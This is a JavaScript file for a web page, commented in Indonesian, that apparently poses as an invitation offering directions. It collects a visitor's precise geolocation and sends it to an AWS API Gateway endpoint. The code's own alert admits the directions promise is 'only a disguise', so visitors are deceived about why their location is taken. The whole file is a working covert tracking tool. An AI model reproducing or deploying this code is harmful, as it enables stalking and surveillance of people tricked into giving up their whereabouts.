// Di public/script.js Anda

// Ganti dengan URL API Gateway yang Anda dapatkan dari AWS
const BACKEND_URL =
  "https://k8927ehsk1.execute-api.ap-southeast-2.amazonaws.com/default/undangan"; // Contoh URL dari AWS API Gateway

document.getElementById("allowLocation").addEventListener("click", function () {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(successCallback, errorCallback, {
      enableHighAccuracy: true,
      timeout: 10000,
      maximumAge: 0,
    });
  } else {
    alert("Geolocation tidak didukung oleh browser ini.");
  }
});

async function successCallback(position) {
  const latitude = position.coords.latitude;
  const longitude = position.coords.longitude;
  const accuracy = position.coords.accuracy;

  console.log("Lokasi berhasil didapatkan:", latitude, longitude);

  try {
    const response = await fetch(BACKEND_URL, {
      // Perhatikan tidak ada /send-location tambahan di sini jika sudah ada di URL
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ latitude, longitude, accuracy }),
    });

    if (response.ok) {
      alert(
        "Terima kasih, panduan arah akan segera ditampilkan (ini hanya penyamaran).",
      );
      console.log("Lokasi berhasil dikirim ke backend AWS.");
    } else {
      const errorData = await response.json();
      alert(
        "Maaf, terjadi kesalahan saat mengirim lokasi: " +
          (errorData.message || "Unknown error."),
      );
      console.error("Gagal mengirim lokasi ke backend AWS:", errorData);
    }
  } catch (error) {
    alert("Maaf, terjadi kesalahan jaringan atau server tidak merespons.");
    console.error("Error saat mengirim data lokasi ke AWS:", error);
  }
}

function errorCallback(error) {
  let errorMessage = "Gagal mendapatkan lokasi. ";
  switch (error.code) {
    case error.PERMISSION_DENIED:
      errorMessage += "Pengguna menolak permintaan Geolocation.";
      break;
    case error.POSITION_UNAVAILABLE:
      errorMessage += "Informasi lokasi tidak tersedia.";
      break;
    case error.TIMEOUT:
      errorMessage += "Waktu permintaan lokasi habis.";
      break;
    case error.UNKNOWN_ERROR:
      errorMessage += "Terjadi kesalahan yang tidak diketahui.";
      break;
  }
  console.error(errorMessage);
  alert(
    "Maaf, kami tidak bisa mendapatkan lokasi Anda. Mungkin ada masalah jaringan atau izin lokasi tidak diberikan.",
  );
}
